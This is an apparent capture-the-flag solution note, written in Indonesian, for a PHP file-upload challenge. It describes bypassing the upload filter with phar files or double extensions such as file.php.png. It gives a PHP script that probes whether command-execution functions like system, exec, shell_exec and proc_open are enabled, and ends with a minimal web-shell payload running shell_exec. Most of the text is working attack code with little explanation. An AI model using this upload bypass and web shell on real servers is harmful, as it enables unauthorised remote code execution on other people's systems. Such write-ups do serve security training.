### how to solve

upload file exploit, bisa pakai phar, bisa manipulasi dengan file.php.png dan lainnya
lalu terdapat disable function bisa check disable functions dengan info.php 

lalu bisa check enable functions dengan
```
<?php

$dangerous_functions = array('pcntl_alarm','pcntl_fork','pcntl_waitpid','pcntl_wait','pcntl_wifexited','pcntl_wifstopped','pcntl_wifsignaled','pcntl_wifcontinued','pcntl_wexitstatus','pcntl_wtermsig','pcntl_wstopsig','pcntl_signal','pcntl_signal_get_handler','pcntl_signal_dispatch','pcntl_get_last_error','pcntl_strerror','pcntl_sigprocmask','pcntl_sigwaitinfo','pcntl_sigtimedwait','pcntl_exec','pcntl_getpriority','pcntl_setpriority','pcntl_async_signals','error_log','system','exec','shell_exec','popen','proc_open','passthru','link','symlink','syslog','ld','mail');

foreach ($dangerous_functions as $f) {
  if (function_exists($f)) {
    echo $f . " is enabled<br/>\n";
  }
}

?>



lalu melakukan exploit akhir dengan 

<?php
// Executes, returns the entire output as a string
echo shell_exec("ls -la");
?>
```